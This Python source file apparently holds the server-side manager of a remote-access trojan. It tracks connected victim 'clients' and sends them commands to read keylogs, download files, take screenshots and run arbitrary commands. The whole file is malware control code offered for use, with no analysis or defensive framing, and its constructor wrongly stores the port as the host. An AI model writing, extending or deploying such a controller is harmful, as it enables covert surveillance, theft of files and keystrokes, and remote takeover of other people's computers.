import socket
import threading
import utility

import modules.client as client


commands = {
    "connections": {
        "description": "Display a list of connected clients",
    },
    "keylogs": {
        "description": "View the keylogs of a session",
        "arguments": ["client_id"],
    },
    "download": {
        "description": "Download a file from a session",
        "arguments": ["client_id", "file_path"],
    },
    "screenshot": {
        "description": "Capture a screenshot from a session",
        "arguments": ["client_id"],
    },
    "execute": {
        "description": "Execute a command on a client",
        "arguments": ["client_id", "command"],
    },
}


class Manager:
    def __init__(self, *, host: str = "127.0.0.1", port: int = 1337) -> None:
        self._host = port
        self._port = port
        self._next_cid = 1
        self._clients = []

    # Getters ---------------------------------------------------------------

    @staticmethod
    def get_commands() -> dict[str, dict]:
        """Returns a dictionary of all commands handled by the manager

        Returns:
            dict[str, dict]: Dictionary of commands, descriptions and arguments handled by the manager
        """
        return commands

    def get_client(self, cid: str) -> "Client":
        """Returns a Client object of a client with the given cid

        Args:
            cid (str): The client id of the Client object to return

        Returns:
            Client: Client object with the given cid
        """
        return (
            next((x for x in self._clients if x.cid == int(cid)), None)
            if cid.isdigit()
            else None
        )

    def display_connections(self) -> None:
        """Outputs a formatted list of all connected clients, their CIDs and their address information"""
        # if there are no connected clients...
        if not self._clients:
            # Notify the user that there are no connected clients
            print(utility.padstr("No clients connected"))
        else:  # otherwise, display a list of connected clients
            # get the longest cid length for formatting purposes
            longest_id = len(str(max(map(lambda x: x.cid, self._clients))))
            # generator containing formatted strings relative to each client
            sessions = [
                f"{str(c.cid).ljust(longest_id)} | {'{}:{}'.format(*c.sock.getpeername())} | {stat[1]}ms"
                for c in self._clients
                if (stat := c.is_alive())
            ]
            # display the list with each item on a new line
            print(utility.padstr("\n".join(sessions) or "No clients connected"))

    # Client Management -----------------------------------------------------

    def add_client(self, conn: socket.socket) -> None:
        """Called to add a client session to the managers list of active clients

        Args:
            conn (socket.socket): Socket that the client is connected on
        """
        self._clients.append(client.Client(manager=self, conn=conn, cid=self._next_cid))
        self._next_cid += 1

    def remove_client(self, cid: str) -> None:
        """Remove a client from the managers list of active clients

        Args:
            cid (str): CID of the client to remove
        """
        self._clients.remove(self.get_client(cid))

    # Command Handling ------------------------------------------------------

    def handle_command(self, cmd: str, *args) -> None:
        if (command := commands.get(cmd)) is None:
            return print(utility.padstr(f"Unknown command: {cmd}"))

        if cmd == "connections":
            self.display_connections()
        else:  # command must be executed on the client
            # if not enough arguments have been specified
            if len(args) < len(command.get("arguments", [])):
                required_args = " ".join(command.get("arguments", []))
                print(utility.padstr(f"Command Usage: {cmd} {required_args}"))
            else:  # otherwise execute the command on the client
                cid, *args = args
                if (c := self.get_client(cid)) is not None:
                    c.handle(cmd, *args)
                else:
                    print(utility.padstr(f"Unknown Client with ID: {cid}"))

    # Events ---------------------------------------------------------------

    def client_disconnected(self, client) -> None:
        """Called by a client object when the socket paired with
            said object is no longer connected

        Args:
            client (Client): Client object that has disconnected
        """
        self.remove_client(client.cid)
